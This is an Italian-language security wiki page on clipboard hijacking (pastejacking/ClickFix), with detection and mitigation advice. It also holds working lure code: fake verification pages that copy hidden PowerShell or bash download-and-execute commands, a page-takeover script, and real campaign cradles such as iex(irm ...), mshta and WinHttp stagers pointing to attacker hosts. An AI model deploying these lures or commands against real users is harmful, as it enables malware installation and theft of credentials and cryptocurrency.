# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Non incollare mai nulla che non abbiate copiato voi stessi." – un consiglio vecchio, ma ancora valido

## Panoramica

Il clipboard hijacking – noto anche come *pastejacking* – sfrutta il fatto che gli utenti copiano e incollano abitualmente comandi senza controllarli. Una pagina web malevola (o qualsiasi contesto con supporto JavaScript, come un'applicazione Electron o Desktop) inserisce programmaticamente testo controllato dall'attacker nella system clipboard. Le vittime vengono incoraggiate, normalmente tramite istruzioni di social engineering accuratamente elaborate, a premere **Win + R** (finestra Esegui), **Win + X** (Accesso rapido / PowerShell), oppure ad aprire un terminale e *incollare* il contenuto della clipboard, eseguendo immediatamente comandi arbitrari.

Poiché **non viene scaricato alcun file e non viene aperto alcun allegato**, la tecnica aggira la maggior parte dei controlli di sicurezza per e-mail e contenuti web che monitorano allegati, macro o l'esecuzione diretta di comandi. L'attacco è quindi popolare nelle campagne di phishing che distribuiscono famiglie di malware commodity come NetSupport RAT, Latrodectus loader o Lumma Stealer.<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

Un'altra variante del **clipboard hijacking** non incolla affatto comandi: attende che la vittima copi un **cryptocurrency wallet address**, quindi lo sostituisce silenziosamente con uno controllato dall'attacker appena prima dell'incolla. Questo è particolarmente efficace con i formati wallet lunghi, perché gli utenti spesso verificano solo i primi/ultimi caratteri.<sup>[[8]](#references)</sup>

Tratti comuni osservati nel mondo reale:
- **Thin loader + nested payload**: l'app/exe visibile sembra uno strumento legittimo per il trading o per ottenere "profit", mentre il clipper reale è nascosto più in profondità nel bundle (ad esempio un loader .NET che avvia un payload Rust annidato).
- **Regex-driven replacement**: il malware identifica stringhe come `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, o persino stringhe generiche **di 44 caratteri simili a Solana**, e le riscrive sostituendole con wallet dell'attacker.
- **Wallet rotation at scale**: i moderni sample Windows possono contenere **migliaia** di wallet sostitutivi per valuta invece di un singolo indirizzo statico, riducendo il consumo della reputazione del wallet dopo ogni furto.<sup>[[8]](#references)</sup>

### Windows clipper flow

Un'implementazione comune consiste in una hidden window registrata con **`AddClipboardFormatListener`**. A ogni aggiornamento della clipboard, il malware esegue tipicamente:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → accede ai dati correnti della clipboard.
- **`GetClipboardData`** → legge il testo.
- **`EmptyClipboard`** + **`SetClipboardData`** → sostituisce la stringa del wallet con il valore dell'attacker.

Regex minime per l'hunting, frequentemente osservate nei clipper:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
La persistenza a livello utente è sufficiente per l'impatto. Un pattern osservato è:<sup>[[8]](#references)</sup>
- Copiare il payload in **`%APPDATA%\silke\silke.exe`**
- Creare un **LNK nella cartella Startup** in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Idee per il rilevamento:
- Processi che chiamano continuamente le API degli appunti e contemporaneamente scrivono in `%APPDATA%` e nella cartella **Startup** dell'utente.
- Creazione di nuovi LNK/eseguibili seguita da riscritture degli appunti contenenti wallet-address.
- Archivi o bundle di fake-software contenenti molti file inutilizzati e un piccolo launcher che avvia un binary annidato.

### Rimozione della quarantena tramite social engineering su macOS + persistenza tramite LaunchAgent

Su macOS, alcune campagne distribuiscono un helper **`unlocker.command`** e istruiscono la vittima a fare clic con il tasto destro → **Open** se Gatekeeper segnala che l'app è danneggiata o proviene da uno sviluppatore non identificato. Lo script rimuove semplicemente la quarantena e avvia il file `.app` adiacente:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Questo **non** è un exploit di Gatekeeper; è un **bypass della quarantine tramite social engineering** che sfrutta il fatto che le decisioni di Gatekeeper dipendono dall'xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Dopo l'esecuzione, il clipper può persistere come utente corrente scrivendo:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent con `RunAtLoad` e `KeepAlive`

Un dettaglio utile per la difesa è che alcuni sample implementano un **watchdog self-healing** che riscrive il LaunchAgent e il wrapper ogni ~30 secondi. Se rimuovi prima il plist **senza terminare il processo in esecuzione**, il malware potrebbe ricrearlo immediatamente.<sup>[[8]](#references)</sup> Ordine di cleanup sicuro:
1. Termina il processo clipper attivo.
2. Esegui l'unload/elimina il plist del LaunchAgent.
3. Elimina `~/launch.sh` e il payload copiato.

### Nota sulla distribuzione: la reputazione falsa come force multiplier

Per questa famiglia, il malware può rimanere tecnicamente semplice mentre è il **distribution layer** a fare il lavoro pesante: fake stars/forks su GitHub, recensioni/download su SourceForge, commenti/visualizzazioni di tutorial su YouTube e commenti/voti apparentemente benigni su VirusTotal vengono utilizzati per far sembrare il binary affidabile prima dell'esecuzione.<sup>[[8]](#references)</sup>

## Pulsanti Copy forzati e payload nascosti (one-liner macOS)

Alcuni infostealer per macOS clonano i siti degli installer (ad esempio Homebrew) e **obbligano a usare un pulsante “Copy”**, impedendo agli utenti di evidenziare solo il testo visibile. La voce della clipboard contiene il comando dell'installer previsto più un payload Base64 aggiunto (ad esempio `...; echo <b64> | base64 -d | sh`), così un singolo paste esegue entrambi mentre la UI nasconde lo stage aggiuntivo.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Le campagne più vecchie usavano `document.execCommand('copy')`, mentre quelle più recenti si basano sull'**Clipboard API** asincrona (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Il flusso ClickFix / ClearFake

1. L'utente visita un sito typosquatted o compromesso (ad es. `docusign.sa[.]com`)
2. Il JavaScript **ClearFake** iniettato chiama un helper `unsecuredCopyToClipboard()` che memorizza silenziosamente negli appunti un one-liner PowerShell codificato in Base64.
3. Le istruzioni HTML dicono alla vittima: *“Premi **Win + R**, incolla il comando e premi Invio per risolvere il problema.”*
4. `powershell.exe` viene eseguito e scarica un archivio che contiene un eseguibile legittimo e una DLL malevola (classico DLL sideloading).
5. Il loader decritta gli stage aggiuntivi, inietta shellcode e installa la persistenza (ad es. un'attività pianificata), eseguendo infine NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Esempio di catena NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legittimo Java WebStart) cerca `msvcp140.dll` nella propria directory.
* La DLL dannosa risolve dinamicamente le API con **GetProcAddress**, scarica due binari (`data_3.bin`, `data_4.bin`) tramite **curl.exe**, li decritta usando una rolling XOR key `"https://google.com/"`, inietta lo shellcode finale ed estrae **client32.exe** (NetSupport RAT) in `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Scarica `la.txt` con **curl.exe**
2. Esegue il downloader JScript all'interno di **cscript.exe**
3. Recupera un payload MSI → rilascia `libcef.dll` accanto a un'applicazione firmata → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer tramite MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La chiamata **mshta** avvia uno script PowerShell nascosto che recupera `PartyContinued.exe`, estrae `Boat.pst` (CAB), ricostruisce `AutoIt3.exe` tramite `extrac32` e concatenazione di file e infine esegue uno script `.a3x` che esfiltra le credenziali del browser verso `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK con C2 rotante (PureHVNC)

Alcune campagne ClickFix evitano completamente i download di file e istruiscono le vittime a incollare un one-liner che recupera ed esegue JavaScript tramite WSH, lo rende persistente e ruota il C2 ogni giorno. Catena osservata in un esempio:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Caratteristiche principali
- URL offuscato e invertito durante l'esecuzione per eludere un'ispezione superficiale.
- JavaScript si rende persistente tramite uno Startup LNK (WScript/CScript) e seleziona il C2 in base al giorno corrente, consentendo una rapida rotazione dei domini.<sup>[[3]](#references)</sup>

Frammento JS minimale utilizzato per ruotare i C2 in base alla data:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La fase successiva distribuisce comunemente un loader che stabilisce la persistence e scarica un RAT (ad esempio PureHVNC), spesso configurando il pinning TLS su un certificato hardcoded e suddividendo il traffico in chunk.<sup>[[3]](#references)</sup>

Idee di rilevamento specifiche per questa variante
- Albero dei processi: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (o `cscript.exe`).
- Artefatti di avvio: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` che invoca WScript/CScript con un percorso JS sotto `%TEMP%`/`%APPDATA%`.
- Telemetria del Registro/RunMRU e delle righe di comando contenente `.split('').reverse().join('')` o `eval(a.responseText)`.
- Esecuzioni ripetute di `powershell -NoProfile -NonInteractive -Command -` con payload stdin di grandi dimensioni, per fornire script lunghi senza righe di comando estese.
- Scheduled Tasks che successivamente eseguono LOLBins come `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sotto un task/percorso dall'aspetto simile a un updater (ad esempio `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Hostname e URL C2 con rotazione giornaliera e pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlare gli eventi di scrittura negli appunti, seguiti dall'incolla tramite Win+R e dall'esecuzione immediata di `powershell.exe`.

I Blue team possono combinare la telemetria degli appunti, della creazione dei processi e del Registro per individuare con precisione l'abuso del pastejacking:

* Registro di Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` conserva la cronologia dei comandi **Win + R**: cercare voci Base64 insolite o offuscate.
* Security Event ID **4688** (Process Creation) in cui `ParentImage` == `explorer.exe` e `NewProcessName` appartiene a { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** per la creazione di file sotto `%LocalAppData%\Microsoft\Windows\WinX\` o nelle cartelle temporanee subito prima dell'evento 4688 sospetto.
* Sensori EDR per gli appunti (se presenti): correlare `Clipboard Write` seguito immediatamente da un nuovo processo PowerShell.

## Pagine di verifica in stile IUAM (ClickFix Generator): copia dagli appunti alla console + payload consapevoli del sistema operativo

Campagne recenti producono in massa false pagine di verifica CDN/browser ("Solo un momento…", in stile IUAM) che inducono gli utenti a copiare dagli appunti comandi specifici per il sistema operativo nelle console native. Questo sposta l'esecuzione fuori dalla sandbox del browser e funziona su Windows e macOS.<sup>[[4]](#references)</sup>

Caratteristiche principali delle pagine generate dal builder
- Rilevamento del sistema operativo tramite `navigator.userAgent` per adattare i payload (Windows PowerShell/CMD rispetto a macOS Terminal). Decoy/no-op opzionali per i sistemi operativi non supportati, così da mantenere l'illusione.
- Copia automatica negli appunti in seguito ad azioni innocue nell'interfaccia (checkbox/Copia), mentre il testo visibile può differire dal contenuto degli appunti.
- Blocco dei dispositivi mobili e popover con istruzioni dettagliate: Windows → Win+R→incolla→Invio; macOS → apri Terminal→incolla→Invio.
- Offuscamento opzionale e injector in un singolo file per sovrascrivere il DOM di un sito compromesso con una UI di verifica in stile Tailwind (non è necessaria la registrazione di un nuovo dominio).<sup>[[4]](#references)</sup>

Esempio: differenza tra contenuto degli appunti e testo visualizzato + branching consapevole del sistema operativo
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
persistence di macOS della prima esecuzione
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` in modo che l'esecuzione continui dopo la chiusura del terminale, riducendo gli artefatti visibili.<sup>[[4]](#references)</sup>

In-place page takeover su siti compromessi
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Idee per il rilevamento e la threat hunting specifiche per le lure in stile IUAM
- Web: pagine che associano la Clipboard API a widget di verifica; discrepanza tra il testo visualizzato e il payload negli appunti; branching di `navigator.userAgent`; Tailwind + sostituzione single-page in contesti sospetti.
- Endpoint Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` poco dopo un'interazione con il browser; installer batch/MSI eseguiti da `%TEMP%`.
- Endpoint macOS: Terminal/iTerm che avviano `bash`/`curl`/`base64 -d` con `nohup` in prossimità di eventi del browser; processi in background che sopravvivono alla chiusura del terminale.
- Correlare la cronologia `RunMRU` di Win+R e le scritture negli appunti con la successiva creazione di processi console.

Vedi anche le seguenti tecniche di supporto

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Evoluzioni 2026 delle fake CAPTCHA / ClickFix (ClearFake, Scarlet Goldfinch)

- ClearFake continua a compromettere siti WordPress e a iniettare JavaScript loader che concatenano host esterni (Cloudflare Workers, GitHub/jsDelivr) e persino chiamate blockchain di tipo “etherhiding” (ad esempio POST verso endpoint API di Binance Smart Chain come `bsc-testnet.drpc[.]org`) per recuperare la logica aggiornata delle lure. Gli overlay recenti fanno ampio uso di fake CAPTCHA che istruiscono gli utenti a copiare/incollare una one-liner (T1204.004) invece di scaricare qualcosa.<sup>[[6]](#references)</sup>
- L'esecuzione iniziale viene sempre più delegata a signed script host/LOLBAS. Le catene di gennaio 2026 hanno sostituito il precedente utilizzo di `mshta` con il componente integrato `SyncAppvPublishingServer.vbs`, eseguito tramite `WScript.exe` e con argomenti simili a PowerShell, utilizzando alias/wildcard per recuperare contenuti remoti:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` è firmato e normalmente utilizzato da App-V; abbinato a `WScript.exe` e ad argomenti insoliti (alias `gal`/`gcm`, cmdlet con wildcard, URL jsDelivr) diventa uno stage LOLBAS ad alto segnale per ClearFake.<sup>[[6]](#references)</sup>
- A febbraio 2026, i payload CAPTCHA falsi sono tornati ai download cradles basati esclusivamente su PowerShell. Due esempi attivi:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- La prima chain è un grabber `iex(irm ...)` in-memory; la seconda esegue lo staging tramite `WinHttp.WinHttpRequest.5.1`, scrive un file `.ps1` temporaneo, quindi lo avvia con `-ep bypass` in una finestra nascosta.<sup>[[6]](#references)</sup>

Suggerimenti per il rilevamento e la ricerca di queste varianti
- Lineage dei processi: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` oppure PowerShell cradles subito dopo scritture negli appunti/Win+R.
- Keyword nella command line: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domini jsDelivr/GitHub/Cloudflare Worker, oppure pattern `iex(irm ...)` con raw IP.
- Network: connessioni in uscita verso host CDN worker o endpoint blockchain RPC da script host/PowerShell subito dopo la navigazione web.
- File/registry: creazione di `.ps1` temporanei in `%TEMP%` e voci RunMRU contenenti questi one-liner; bloccare o generare alert quando script firmati LOLBAS (WScript/cscript/mshta) vengono eseguiti con URL esterni o stringhe alias offuscate.

## Tradecraft ClickFix di giugno 2026: telemetria del paste, commenti di falsa verifica e chaining di LOLBin

La telemetria recente di Red Canary mostra che l'indicatore stabile **non è un singolo comando preciso**, ma la combinazione di **paste-and-run assistito dall'utente**, **interpreti trusted/LOLBins**, **flag offuscati**, **recupero remoto** ed **esecuzione immediata**.<sup>[[7]](#references)</sup>

### Pattern rilevanti degli operatori

- **Telemetria di conferma del paste**: alcuni payload chiamano `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` prima dello stage reale. Questo conferma l'interazione dell'utente mantenendo la finestra breve e silenziosa.
- **Commenti di falsa verifica**: i one-liner PowerShell possono aggiungere stringhe come `# Security check ✔️ I'm not a robot Verification ID: 138105`, così il comando continua ad apparire correlato a un CAPTCHA dopo essere stato incollato in Run / nella cronologia di `cmd.exe` / PowerShell.
- **Ricostruzione dinamica dell'URL**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` evita un URL statico nella command line eseguendo comunque download-and-execute in-memory.
- **Esecuzione di installer camuffato**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` sfrutta il casing insolito e caratteri simili a Unicode nei flag per eludere i rilevamenti fragili, pur continuando ad assomigliare a `msiexec.exe`.
- **Chain di LOLBin con escape tramite caret**: `cmd.exe` può nascondere le keyword con escape `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), avviare la shell annidata minimizzata, salvare il contenuto dell'attacker con un'estensione legittima come `.pdf`, quindi eseguirlo tramite `mshta`.<sup>[[7]](#references)</sup>
## Mitigazioni

1. Hardening del browser – disabilitare l'accesso in scrittura agli appunti (`dom.events.asyncClipboard.clipboardItem` ecc.) oppure richiedere un gesto dell'utente.
2. Security awareness – insegnare agli utenti a *digitare* i comandi sensibili o a incollarli prima in un editor di testo.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control per bloccare one-liner arbitrari.
4. Network controls – bloccare le richieste in uscita verso domini noti di pastejacking e malware C2.

## Trick correlati

* **Discord Invite Hijacking** spesso abusa dello stesso approccio ClickFix dopo aver attirato gli utenti in un server malevolo:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Riferimenti

- [1] [Correggere il click: prevenire la attack vector ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: da RAT a Builder a Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [La ClickFix Factory: prima esposizione del generatore IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [Il 2025, l'anno dell'Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: febbraio 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: giugno 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Dalle stelle agli upvote: la falsa reputazione alimenta un crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
